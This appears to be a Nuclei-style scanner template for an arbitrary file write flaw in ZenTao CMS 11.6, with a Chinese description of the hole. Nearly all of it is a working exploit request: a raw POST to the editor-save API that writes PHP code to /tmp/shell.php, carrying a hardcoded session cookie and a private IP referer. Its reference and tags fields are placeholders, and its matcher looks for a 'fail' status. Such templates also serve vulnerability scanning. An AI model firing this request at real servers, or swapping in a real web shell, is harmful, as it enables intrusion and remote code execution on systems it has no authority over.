id: zentaocms-WriteFile
info:
  name: zentaocms-WriteFile
  author: apple
  severity: high
  description: 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口任意文件写入。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /api-getModel-editor-save-filePath=/tmp/shell.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://192.168.100.152:8084/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: zentaosid=fvom4rntrf5fkfddcb764dng9l; lang=zh-cn; device=desktop; theme=default; windowWidth=1200; windowHeight=1002
        Connection: close
        Content-Length: 30

        fileContent=<?php phpinfo();?>
    matchers:
      - type: word
        part: body
        words:
          - '"status":"fail"'
